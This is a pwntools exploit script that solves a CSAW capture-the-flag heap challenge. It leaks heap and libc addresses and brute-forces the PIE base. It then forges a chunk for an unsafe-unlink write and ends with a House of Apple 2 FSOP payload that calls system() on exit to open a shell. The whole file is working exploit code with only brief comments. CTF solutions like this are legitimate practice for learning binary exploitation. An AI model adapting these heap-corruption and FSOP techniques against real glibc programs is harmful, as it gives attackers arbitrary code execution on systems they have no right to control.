from pwn import *

# CREDIT: https://github.com/RoderickChan/pwncli/tree/main
import io_file

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chal_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

serv = "chals.ctf.csaw.io"
port = 21001

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r

r = conn()


def malloc(index: int, size: int):
    sla(b'>> ', b'1')
    sla(b'position: ', sen(index))
    sla(b'of: ', sen(size))

def free(index: int):
    sla(b'>> ', b'2')
    sla(b'position: ', sen(index))

def write(index: int, data: bytes):
    sla(b'>> ', b'3')
    sla(b'position: ', sen(index))
    sna(b'of: ', data)

def read(index: int, num_bytes: int):
    sla(b'>> ', b'4')
    sla(b'position: ', sen(index))
    return r.recv(num_bytes)

def power_up(guess: bytes):
    sla(b'>> ', b'5')
    sna(b'resource: ', guess)
    return b'upgraded' in rcl()

def main():

    # Heap leak
    malloc(0, 0x18)
    free(0)
    heap_base = u64(read(0, 0x18)[:8]) << 12
    log.info(f"{hex(heap_base)=}")

    # libc leak
    malloc(1, 0x418)
    malloc(2, 0x418)
    free(1)
    libc.address = u64(read(1, 0x418)[:8]) - 0x203b20
    log.info(f"{hex(libc.address)=}")
    free(2)

    # Brute force the PIE
    if args.GDB: 
        guess_main_addr = int(input("Enter address of main in hex: "), 16)
    else: 
        guess_main_addr = heap_base - 0x2021000 + 0x1229
        while True:
            if power_up(p64(guess_main_addr)):
                break
            log.info(f"{hex(guess_main_addr)=}")
            guess_main_addr -= 0x1000

    # Unsafe unlink
    malloc(15, 0x500) # For writing the metadata of chunk 2
    free(15)

    target_addr = guess_main_addr - 0x1229 + 0x4060 + 0x8
    malloc(1, 0x418)
    malloc(2, 0x418)
    malloc(3, 0x18) # Barrier chunk
    write(15, b''.join([
        # p64(libc.address + 0x203b20) * 2, # don't want to touch the unsorted bin too much rn

        # fake chunk
        p64(0) + p64(0x411), # size
        p64(target_addr - 3 * 0x8), # fd
        p64(target_addr - 2 * 0x8), # bk
        p64(0x0), # fd_nextsize (prevent it attempting to unlink fd_nextsize and bk_nextsize)
        b'B' * (0x400 - 0x18),

        # Overwrite chunk 5
        p64(0x410), # prev_size
        p64(0x420) # size (set PREV_INUSE to 0 to mark forged chunk as free)
    ]))
    free(2)

    # Overwrite with address to read
    write(1, b'A'*0x18 + p64(libc.sym["_IO_2_1_stdout_"]))

    # Use the pre-made House of Apple 2 to FSOP on exit into a shell
    file = io_file.IO_FILE_plus_struct()
    payload = file.house_of_apple2_execmd_when_exit(
            libc.sym["_IO_2_1_stdout_"],
            libc.sym["_IO_wfile_jumps"],
            libc.sym["system"])
    write(1, payload)

    # exit()
    sla(b'>> ', b'6')

    r.interactive()

if __name__ == "__main__":
    main()